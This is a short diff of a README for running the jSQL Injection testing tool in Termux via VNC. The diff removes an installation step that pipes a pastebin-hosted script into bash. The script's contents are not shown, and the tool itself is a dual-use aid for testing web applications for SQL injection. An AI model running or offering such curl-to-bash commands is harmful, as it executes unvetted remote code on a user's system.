@@ -15,14 +15,7 @@ TERMUX JSQLi  TOOL ALLOWED RUN JSQL Injection TOOL IN TERMUX USING VNC SERVER TH
 Using jsql-injection, users can test their web applications for SQL injection vulnerabilities and understand the potential risks and exploits associated with these vulnerabilities.
 
 
-##  Single Command Installation ⬇️
 
-
-```
-
-curl -sL https://pastebin.com/raw/sjSCn35d | bash
-
-```
 
 # Working
 
